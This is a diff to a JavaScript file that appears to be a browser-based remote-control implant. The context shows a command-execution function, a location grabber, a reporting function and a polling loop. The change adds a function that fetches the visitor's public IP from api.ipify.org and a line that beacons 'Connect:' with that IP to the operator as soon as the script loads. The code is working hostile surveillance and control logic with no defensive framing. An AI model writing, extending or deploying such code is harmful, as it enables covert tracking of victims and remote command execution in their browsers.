@@ -34,6 +34,12 @@ function getLocation() {
         return "Get Location Error!";
     }
 }
+function getIP() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET","https://api.ipify.org/",false)
+    xhr.send();
+    return xhr.responseText.replace("\n","")
+}
 
 function exec(command) {
     command = command.replace("\n","")
@@ -57,10 +63,10 @@ function exec(command) {
         xhr.onload = function (e) {
             if (xhr.readyState === 4) {
                 if (xhr.status === 200) {
-                    sendReturn("[IP] "+xhr.responseText);
+                    sendReturn( "[IP] "+xhr.responseText);
                 }
                 else{
-                    sendReturn("[ ERROR ] GET IP ERROR!");
+                    sendReturn( "[ ERROR ] GET IP ERROR!" );
                 }
             }
         };
@@ -92,6 +98,8 @@ function exec(command) {
         return false;
     }
 }
+
+sendReturn("Connect: "+getIP());
 
 loop = setInterval(function () {
     try{
